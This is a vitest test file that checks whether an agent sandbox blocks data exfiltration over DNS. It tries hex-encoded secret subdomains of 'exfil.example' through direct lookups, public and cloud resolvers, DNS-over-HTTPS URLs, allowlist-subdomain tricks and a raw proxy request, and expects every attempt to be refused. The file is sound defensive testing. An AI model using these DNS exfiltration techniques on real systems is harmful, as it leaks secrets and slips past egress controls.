import { beforeAll, describe, expect, it } from 'vitest';
import { egressRunnable, useEgress } from './egress.js';
import { cli } from './helpers.js';

/**
 * Isolation n° 4: exfiltration by DNS (ORC-219, against ORC-213). The sandbox resolves no name itself, by any resolver, and
 * the proxy, the only one that resolves, never resolves the name of a host it refuses: data put in a name reaches no DNS
 * server. On a stand-in internet that records each name the proxy resolves; the control, a listed host, is recorded.
 */
// Lowercase: the proxy journals a host as it normalises it.
const SECRET = '736563726574636f64656f667468657265706f';
const exfil = `${SECRET}.exfil.example`;

describe.skipIf(!egressRunnable)(`isolation 4: exfiltration by DNS (${cli})`, () => {
  const egress = useEgress('iso4');
  let box: Awaited<ReturnType<typeof egress.open>>;

  beforeAll(async () => {
    box = await egress.open('limited');
  }, 300_000);

  it('resolves no name itself: not by getaddrinfo, nor by a query to a public, metadata or engine resolver', async () => {
    expect(await box.probe('lookup', exfil)).toMatch(/^ERR /);
    expect(await box.probe('lookup', 'registry.npmjs.org')).toMatch(/^ERR /);
    // 169.254.169.253: the AWS resolver; 127.0.0.11: the engine's own, on a network the sandbox does not have.
    for (const server of ['8.8.8.8', '1.1.1.1', '2001:4860:4860::8888', '169.254.169.253', '127.0.0.11']) expect(await box.probe('query', exfil, server), server).toMatch(/^ERR /);
    expect(egress.lookups).toEqual([]);
  });

  it('refuses DNS over HTTPS, and never resolves a name it refuses, the secret put in a host name, a subdomain of a listed host or a port', async () => {
    for (const url of [`https://dns.google/resolve?name=${exfil}`, `https://cloudflare-dns.com/dns-query?name=${exfil}`, `https://1.1.1.1/dns-query?name=${exfil}`, `https://${exfil}/`]) {
      expect(await box.probe('fetch', url), url).toMatch(/^ERR /);
    }
    for (const target of [`${exfil}:443`, `${SECRET}.registry.npmjs.org:443`, `registry.npmjs.org.${exfil}:443`, `${exfil}:53`, 'registry.npmjs.org:53']) {
      expect(await box.probe('connect', target), target).toBe('HTTP/1.1 403 Forbidden');
    }
    expect(await box.probe('raw', JSON.stringify(`GET http://${exfil}/ HTTP/1.1\r\nHost: ${exfil}\r\n\r\n`))).toBe('HTTP/1.1 403 Forbidden');
    expect(egress.lookups).toEqual([]);
    expect(egress.seen).toEqual([]);
    // Each refusal journaled: the run's trace has the name the agent tried.
    expect((await box.journal()).filter((e) => e.host.includes(SECRET)).length).toBeGreaterThanOrEqual(4);
  });

  it('the control: a listed host is resolved by the proxy alone, and reached', async () => {
    expect(await box.probe('fetch', 'https://registry.npmjs.org/is-number')).toBe('200 https://registry.npmjs.org/is-number');
    expect(egress.lookups).toContain('registry.npmjs.org');
    expect(egress.seen).toContainEqual(expect.objectContaining({ host: 'registry.npmjs.org', url: '/is-number' }));
  });
});
